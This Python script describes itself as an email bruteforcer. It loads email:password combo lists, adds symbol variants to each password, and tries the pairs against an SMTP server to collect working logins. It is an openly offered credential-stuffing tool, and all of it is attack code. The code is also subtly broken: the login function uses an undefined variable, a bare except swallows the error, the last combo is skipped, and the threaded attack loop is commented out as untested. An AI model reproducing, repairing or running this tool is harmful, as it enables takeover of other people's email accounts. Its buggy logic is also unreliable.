import smtplib
import email
import sys
import time
import os
import argparse
import threading


parser = argparse.ArgumentParser(description='Simple email bruteforcer')
parser.add_argument('-c','--combo-list', help='Specify the list of email:password combos', required=True)
parser.add_argument('-s','--smtp', help='Set the smtp server (exemple: smtp.mail.ru)', required=True)
parser.add_argument('-p','--smtp-port', help='Set the smtp port', required=True)
parser.add_argument('-o','--output-file', help='Specify the output file for found combinations', required=True)
args = vars(parser.parse_args())

combos = args['combo_list']
smtp_server = args['smtp']
port = args['smtp_port']
output_file = args['output_file']

def split_combos(combos):
    emails = []
    passwords = []
    for combo in combos:
        if ':' in combo:
            x = combo.split(':')
            emails.append(x[0].strip())
            passwords.append(x[1].strip())
    return emails, passwords

def sanitize(passwd):
    return passwd.replace('!','').replace('$','').replace('#','').replace('*','')

def generate_expanded_combos(emails, passwords):
    complete_combos = []
    possible_permutes = ['','!','$','$#','$#*','$#!']
    for i in range(0,len(passwords)-1):
        for permute in possible_permutes:
            complete_combos.append(f'{emails[i]}:{sanitize(passwords[i])+permute}')
    return complete_combos

def try_password(password, smtp_server, port, email, working_list):
    try:
        smtp = smtplib.SMTP_SSL(smtp_server, int(port))
        smtp.ehlo()
        answer, status  = smtp.login(email, passwd)
        if status == b'Authentication succeeded':
            print(f"\n[+]Found: {email}:{passwd}")
            working_list.append(f'{email}:{passwd}')
        else:
            raise ConnectionResetError
    except:
        time.sleep(1)
        pass

def main():
    loaded_combos = open(combos, 'r').readlines()
    emails, passwords = split_combos(loaded_combos)
    full_combos = generate_expanded_combos(emails, passwords)
    thread_list = []
    working_combos = []
    for combo in full_combos:
        combo = combo.split(':')
        email = combo[0]
        passwd = combo[1]
        print(f'{email}:{passwd}')
        
    ### THIS BLOCK BELOW IS UNTESTED ###
    #    t = threading.Thread(target=try_password, args=(passwd, smtp_server, port, email, working_combos))
    #    thread_list.append(t)
    #    t.start()
    #for thread in thread_list:
    #    thread.join()
    #with open(output_file, 'w') as of:
    #    of.writelines(working_combos)
    

if __name__ == "__main__":
    main()
